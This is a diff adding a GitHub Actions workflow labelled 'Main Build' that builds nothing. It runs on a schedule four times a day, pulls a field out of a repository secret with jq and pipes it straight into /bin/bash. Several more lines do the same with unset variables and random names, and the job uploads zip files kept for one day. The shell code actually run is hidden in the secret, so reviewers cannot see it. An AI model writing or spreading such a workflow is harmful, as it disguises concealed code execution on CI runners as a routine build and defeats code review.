@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          javvn184: ${{ secrets.javvn184 }}
+        run: |
+          printf '%s' "$javvn184" | jq -r .jlrg663 | /bin/bash
+          echo $jjxj708 | jq -r .ewvn49458 | /bin/bash
+          printf '%s' "$whc44799" | jq -r .lvxx35157 | /bin/bash
+          printf '%s' "$fn2761" | jq -r .v59 | /bin/bash
+          echo $fis8283 | jq -r .geosb45913 | /bin/bash
+          echo $n288 | jq -r .yuv94 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: M67PUxcN
+          path: "*.zip"
+          retention-days: 1
